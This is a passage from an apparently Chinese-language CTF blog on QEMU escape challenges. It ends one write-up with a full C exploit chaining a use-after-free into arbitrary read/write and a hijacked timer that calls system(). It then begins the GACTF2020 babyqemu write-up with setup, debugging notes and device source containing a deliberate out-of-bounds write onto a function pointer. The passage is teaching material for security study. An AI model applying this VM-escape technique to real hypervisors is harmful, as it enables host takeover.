class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回映射内某 offset 的可直接访问指针 */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">volatile</span> <span class="type">void</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">virt_to_phys</span><span class="params">(<span class="type">void</span>* vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> pagesize = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">uint64_t</span> va = (<span class="type">uint64_t</span>)vaddr;</span><br><span class="line">    <span class="type">uint64_t</span> page_index = va / pagesize;</span><br><span class="line">    <span class="type">uint64_t</span> offset = page_index * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> entry = <span class="number">0</span>;</span><br><span class="line">    <span class="type">ssize_t</span> n = pread(fd, &amp;entry, <span class="keyword">sizeof</span>(entry), offset);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(entry)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>)) || (entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">62</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// not present or swapped</span></span><br><span class="line">        errno = EFAULT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint64_t</span> pfn = entry &amp; ((<span class="number">1ULL</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (pfn * pagesize) + (va % pagesize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">FUN_OPT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SIZE = <span class="number">0x00</span>,</span><br><span class="line">    ADDR = <span class="number">0x04</span>,</span><br><span class="line">    RESULT_ADDR = <span class="number">0x08</span>,</span><br><span class="line">    INDEX = <span class="number">0x0C</span>,</span><br><span class="line">    HANDLE_DATA = <span class="number">0x10</span>,</span><br><span class="line">    CREATE_REQ = <span class="number">0x14</span>,</span><br><span class="line">    DELETE_REQ = <span class="number">0x18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> buf[<span class="number">3</span> &lt;&lt; <span class="number">10</span>];</span><br><span class="line"><span class="type">size_t</span> req_addr;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_address_read</span><span class="params">(<span class="type">size_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">2</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>)) = (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">8</span>) = address;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x18</span>) = req_addr;</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">    mmio_read32(HANDLE_DATA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_address_write</span><span class="params">(<span class="type">size_t</span> address)</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">2</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>)) = (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">8</span>) = address;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x10</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">2</span> &lt;&lt; <span class="number">10</span>) + <span class="number">0x18</span>) = req_addr;</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x1919810</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    mmio_init(<span class="string">&quot;0000:00:04.0&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set ADDR to buf for controling rw data</span></span><br><span class="line">    mmio_write32(ADDR, virt_to_phys(buf));</span><br><span class="line">    <span class="comment">// set RESULT_ADDR to trigger uaf</span></span><br><span class="line">    mmio_write32(RESULT_ADDR, mmio_phys_base() + DELETE_REQ);</span><br><span class="line"></span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(INDEX, <span class="number">0</span>);</span><br><span class="line">    mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_read32(HANDLE_DATA);</span><br><span class="line"></span><br><span class="line">    qword_dump(<span class="string">&quot;leak req addr from tcache_perthread_struct (req-&gt;list[0])&quot;</span>, buf, <span class="number">0x400</span>);</span><br><span class="line">    req_addr = *(<span class="type">size_t</span>*)(buf + <span class="number">0x278</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] req addr: %#llx\n&quot;</span>, req_addr);</span><br><span class="line">    <span class="type">size_t</span> qemu_leak_addr = *(<span class="type">size_t</span>*)(buf + <span class="number">0x358</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_leak addr: %#llx\n&quot;</span>, qemu_leak_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uaf write to change chunk1&#x27;s fd to req</span></span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + (<span class="number">1</span> &lt;&lt; <span class="number">10</span>)) = req_addr;</span><br><span class="line">    mmio_write32(INDEX, <span class="number">1</span>);</span><br><span class="line">    mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(HANDLE_DATA, <span class="number">0x1919810</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare for arb rw</span></span><br><span class="line">    mmio_write32(SIZE, (<span class="number">3</span> - <span class="number">1</span>) &lt;&lt; <span class="number">10</span>);</span><br><span class="line">    mmio_write32(CREATE_REQ, <span class="number">0x114514</span>);</span><br><span class="line">    mmio_write32(RESULT_ADDR, virt_to_phys(buf) + <span class="number">0x400</span>); <span class="comment">// not trigger uaf</span></span><br><span class="line"></span><br><span class="line">    arbitrary_address_read(qemu_leak_addr);</span><br><span class="line">    <span class="type">size_t</span> qemu_base = *(<span class="type">size_t</span>*)buf - <span class="number">0x6761b0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu base: %#llx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="type">size_t</span> system_plt = qemu_base + <span class="number">0x2b8a70</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system@plt addr: %#llx\n&quot;</span>, system_plt);</span><br><span class="line">    <span class="type">size_t</span> main_loop_tlg_addr = qemu_base + <span class="number">0x112cd40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] main_loop_tlg addr: %#llx\n&quot;</span>, main_loop_tlg_addr);</span><br><span class="line"></span><br><span class="line">    arbitrary_address_read(main_loop_tlg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> QEMUTimerList_addr = *(<span class="type">size_t</span>*)(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] QEMUTimerList addr: %#llx\n&quot;</span>, QEMUTimerList_addr);</span><br><span class="line"></span><br><span class="line">    arbitrary_address_read(QEMUTimerList_addr);</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + <span class="number">0x58</span>) = system_plt;</span><br><span class="line">    *(<span class="type">size_t</span>*)(buf + <span class="number">0x60</span>) = QEMUTimerList_addr + <span class="number">0x200</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf + <span class="number">0x200</span>, <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>);</span><br><span class="line">    arbitrary_address_write(QEMUTimerList_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="GACTF2020-babyqemu"><a href="#GACTF2020-babyqemu" class="headerlink" title="GACTF2020 babyqemu"></a>GACTF2020 babyqemu</h1><p>虚拟机密码为 <code>root</code></p>
<h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于利用方法不受环境影响，没有用 docker 环境。启动脚本需要修改路径为相对路径。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository ppa:linuxuprising/libpng12</span><br><span class="line"><span class="built_in">sudo</span> apt install libpng12-0</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> add-apt-repository universe</span><br><span class="line"><span class="built_in">sudo</span> apt install libncursesw5</span><br></pre></td></tr></table></figure></div>

<p>调试时需要添加 <code>-monitor /dev/null</code> 参数，这样 <code>Ctrl-C</code> 能切换到 gdb 调试。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb -args ./qemu-system-x86_64 \</span><br><span class="line">    -kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet&quot;</span> \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -m 2G -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -L ./pc-bios -smp 1 \</span><br><span class="line">    -device denc</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>因为你用 <code>-nographic</code> 时，QEMU 会<strong>默认把“监控台+串口”复用到当前终端的 stdio（等价于 <code>-serial mon:stdio</code>）</strong>。</p>
<p>这个复用模式会把你的终端切到 <strong>raw 模式</strong>（关闭 ISIG），于是你按下 <code>Ctrl-C</code> 不再触发终端的 SIGINT，而只是一个普通字节 <code>0x03</code> 被 QEMU&#x2F;guest 吃掉了，gdb 收不到中断，自然“按不进去”。</p>
<p>你加了这句——</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure></div>

<p>就等于<strong>显式关闭了 <code>-nographic</code> 的“隐式 mon:stdio”</strong>：QEMU 不再把 monitor 绑到你的终端，也就**不会把终端切 raw、不会吞掉 <code>Ctrl-C</code>**。这样 <code>Ctrl-C</code> 又会作为 SIGINT 先到 gdb，gdb 才能打断并停住被调试的 QEMU 进程。</p>
</blockquote>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>设备相关的符号被去除。可以通过搜索 <code>denc-mmio</code> 定位到相关函数。</p>
<p>存在一处花指令，直接去除。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00000000003AA140 E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                <span class="keyword">call</span>    $+<span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000003AA140</span><br><span class="line"><span class="symbol">.text:</span>00000000003AA145 <span class="number">83</span> <span class="number">04</span> <span class="number">24</span> <span class="number">05</span>                   <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>], <span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>00000000003AA149 C3                            <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></div>

<p>题目部分代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hw/misc/denc.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_PCI_DENC <span class="string">&quot;denc&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(DencState, PCI_DENC)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 设备状态</span></span><br><span class="line"><span class="comment"> * - 两个 BAR：BAR0 = MMIO(4KB)，BAR1 = PMIO(4KB)</span></span><br><span class="line"><span class="comment"> * - key: 32字节密钥；buf: 8个u32寄存器</span></span><br><span class="line"><span class="comment"> * - fun: 函数指针（漏洞触发点：可被溢出部分覆盖 + 通过特定端口触发调用）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 布局特意让 fun 紧跟在 buf 之后，便于通过 MMIO 范围放大导致的 OOB 覆盖到 fun。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">uint64_t</span> <span class="params">(*DencFun)</span><span class="params">(<span class="type">uint32_t</span> *buf, <span class="type">uint64_t</span> a, <span class="type">uint64_t</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DencState</span> &#123;</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line"></span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="type">uint64_t</span> pad;</span><br><span class="line">    <span class="type">uint8_t</span>  seed[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span>  key[<span class="number">40</span>];        <span class="comment">// 0x20</span></span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">8</span>];         <span class="comment">// 8 * 4 = 0x20</span></span><br><span class="line">    DencFun  fun;            <span class="comment">// 函数指针（漏洞目标）</span></span><br><span class="line">&#125; DencState;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------- MMIO (BAR0) ----------------</span></span><br><span class="line"><span class="comment"> * - 仅 32-bit 对齐访问</span></span><br><span class="line"><span class="comment"> * - 写：addr ∈ [0, 0x24] 且 4 字节对齐 -&gt; buf[addr&gt;&gt;2] = val ^ *(u32*)(key+addr)</span></span><br><span class="line"><span class="comment"> * - 读：addr ∈ [0, 0x24] 且 4 字节对齐 -&gt; 返回 buf[addr&gt;&gt;2]</span></span><br><span class="line"><span class="comment"> * - 越界/未对齐读返回 -1 或 0（见反编译），这里保持一致：未对齐返回 -1，对齐但越界返回 0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：buf 只有 8 个 u32（0..0x1F），但范围却允许到 0x24，</span></span><br><span class="line"><span class="comment"> *       因此 addr=0x20/0x24 会导致对 buf 的 OOB 访问，从而覆盖紧随其后的 fun 指针。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">denc_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    DencState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || (addr &amp; <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;        <span class="comment">// 与反编译一致</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt;= <span class="number">0x24</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> s-&gt;buf[addr &gt;&gt; <span class="number">2</span>];   <span class="comment">// 允许 0x20、0x24（越界读取）</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                       <span class="comment">// 对齐但越界：返回 0（反编译里 result=addr&amp;3=0）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">denc_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    DencState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span> &amp;&amp; ((addr &amp; <span class="number">3</span>) == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr &lt;= <span class="number">0x24</span>) &#123;</span><br><span class="line">            s-&gt;buf[addr &gt;&gt; <span class="number">2</span>] = (<span class="type">uint32_t</span>)val ^ (*(<span class="type">uint32_t</span> *)(s-&gt;key + off));  <span class="comment">// 可能写出 buf 边界，覆盖 fun 低4字节等</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps denc_mmio_ops = &#123;</span><br><span class="line">    .read = denc_mmio_read,</span><br><span class="line">    .write = denc_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------- PMIO (BAR1) ----------------</span></span><br><span class="line"><span class="comment"> * 反编译语义（合并字节/对齐的两种写法，逻辑等价）：</span></span><br><span class="line"><span class="comment"> * - 仅 32-bit 对齐访问</span></span><br><span class="line"><span class="comment"> * - 读：addr ∈ [0, 0x1F] 返回 buf[addr&gt;&gt;2]，否则返回 0</span></span><br><span class="line"><span class="comment"> * - 写：</span></span><br><span class="line"><span class="comment"> *     * 若 addr ∈ [0, 0x1F]：buf[addr&gt;&gt;2] = val ^ *(u32*)(key+addr)</span></span><br><span class="line"><span class="comment"> *     * 若 addr == 0x660 ：调用 fun(buf, 0, 0)</span></span><br><span class="line"><span class="comment"> *   两条可同时存在，且 “0x660 触发调用” 与上述范围无关，只要 4 字节对齐即可。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">denc_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    DencState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span> || (addr &amp; <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (addr &gt; <span class="number">0x1F</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;buf[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">denc_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    DencState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">4</span> &amp;&amp; addr % <span class="number">4</span> == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr &lt;= <span class="number">0x1F</span>) &#123;</span><br><span class="line">            s-&gt;buf[addr &gt;&gt; <span class="number">2</span>] = (<span class="type">uint32_t</span>)val ^ (*(<span class="type">uint32_t</span> *)(s-&gt;key + off));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0x660</span>) &#123;</span><br><span class="line">            <span class="comment">/* 触发任意函数指针调用（题面核心漏洞利用点） */</span></span><br><span class="line">            s-&gt;fun(s-&gt;buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps denc_pmio_ops = &#123;</span><br><span class="line">    .read = denc_pmio_read,</span><br><span class="line">    .write = denc_pmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------- realize / class ---------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">denc_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DencState *s = PCI_DENC(pdev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* BAR0: MMIO 4KB */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(s), &amp;denc_mmio_ops, s,</span><br><span class="line">                          <span class="string">&quot;denc-mmio&quot;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* BAR1: PMIO 4KB */</span></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;pmio, OBJECT(s), &amp;denc_pmio_ops, s,</span><br><span class="line">                          <span class="string">&quot;denc-pmio&quot;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;pmio);</span><br><span class="line">&#125;</span><br><span 